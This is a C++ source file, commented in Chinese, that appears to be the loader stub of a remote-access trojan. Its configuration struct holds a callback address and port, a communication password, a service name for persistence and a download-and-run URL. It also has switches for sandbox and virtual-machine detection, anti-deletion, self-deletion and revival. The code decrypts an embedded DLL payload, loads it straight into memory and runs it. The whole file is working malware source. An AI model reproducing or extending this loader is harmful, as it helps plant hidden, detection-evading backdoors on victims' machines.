#include "stdafx.h"
#include "ShellCode.h"
#include "MemLoadDll.h"

struct DLL_INFO
{
	char LoginAddr[30];     // 上线地址 1  
	UINT LoginPort;         // 上线端口 2
	WORD FileAttribute;     // 文件属性 3
	char UpGroup[30];       // 上线分组 4
	char ConnetPass[20];    // 通讯秘钥 5
	TCHAR ReleaseName[25];  // 安装名称 6
	char ServiceName[70];   // 服务名称 7
	char ServiceDisplayName[70]; // 服务显示 8
	char ServiceDescription[120];// 服务描述 9
	char ReleasePath[100];  // 安装路径 10
	CHAR szDownRun[150];    // 捆绑地址 11
	char Dele_zc;           // 启动类型 12
	BOOL Fwb;               // 微步 13
	BOOL Fhb;               // 哈勃 14
	BOOL Fxn;               // 虚拟 15
	BOOL Ffx;               // 分析 16
	BOOL Fsc;               // 防删 17
	BOOL Fzs;               // 自删 18
	BOOL Fcf;               // 重复 19
	BOOL Ffh;               // 复活 20
	BOOL Fct;               // 穿透 21
	BOOL Fzj;               // 终结 22
	BOOL Fkb;               // 捆绑 23
	BOOL Fsm;               // 睡眠 24
	BOOL Flx;               // 离线 25
	BOOL Fwr;               // 微软 26
}dll_info = 
{
	"SVP7",       // 上线地址 1
		0,        // 上线端口 2
		0,        // 文件属性 3
		"",       // 上线分组 4
		"",       // 通讯密码 5
		"",       // 安装名称 6
		"",       // 服务名称 7
		"",       // 服务显示 8
		"",	      // 服务描述 9
		"",       // 安装途径 10
		"",       // 网络捆绑 11
		0,        // 启动类型 12
		0,        // 0关闭 1开启 微步检测 13
		0,        // 0关闭 1开启 哈勃检测 14
		0,        // 0关闭 1开启 虚拟检测 15
		0,        // 0关闭 1开启 分析检测 16
		0,        // 0关闭 1开启 防删检测 17
		0,        // 0关闭 1开启 自删检测 18
		0,        // 0关闭 1开启 重复检测 19
		0,        // 0关闭 1开启 复活检测 20
		0,        // 0关闭 1开启 穿透检测 21
		0,        // 0关闭 1开启 终结检测 22
		0,        // 0关闭 1开启 捆绑检测 23
		0,        // 0关闭 1开启 睡眠检测 24
		0,        // 0关闭 1开启 离线检测 25
		0,        // 0关闭 1开启 微软杀毒 26
};
void EncryptData(char *szRec,long nLen,long key) //解密插件
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
typedef int (WINAPI *SB360RUN)(DLL_INFO);
void LoadLib( const char *name)
{
	HMEMORYMODULE hDll;
	SB360RUN pfn;
	EncryptData((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize,1024);	
	hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);
	if (hDll==NULL)
		return ;
	pfn=(SB360RUN)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll=NULL;
		
	}
	ExitProcess(0);	
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	char SVP7[]={'S','V','P','7','\0'};
	LoadLib(SVP7);
	return 0;
}



